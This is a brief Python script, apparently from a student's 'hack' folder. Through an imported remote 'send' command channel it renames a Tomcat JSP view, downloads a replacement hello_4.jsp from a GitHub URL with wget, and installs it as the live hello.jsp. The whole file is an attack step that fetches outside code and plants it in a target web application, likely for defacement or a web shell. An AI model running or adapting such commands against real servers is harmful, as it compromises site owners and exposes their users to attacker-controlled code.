from cmd import send
import time

def update():
    print(send("mv webapps/ROOT/WEB-INF/views/hello_4.jsp webapps/ROOT/WEB-INF/views/old.jsp "))
    time.sleep(1)
    print(send("wget -P webapps/ROOT/WEB-INF/views https://raw.githubusercontent.com/vpalaga/school_stuff/refs/heads/main/hack/hello_4.jsp"))
    time.sleep(1)
    print(send("mv webapps/ROOT/WEB-INF/views/hello_4.jsp webapps/ROOT/WEB-INF/views/hello.jsp "))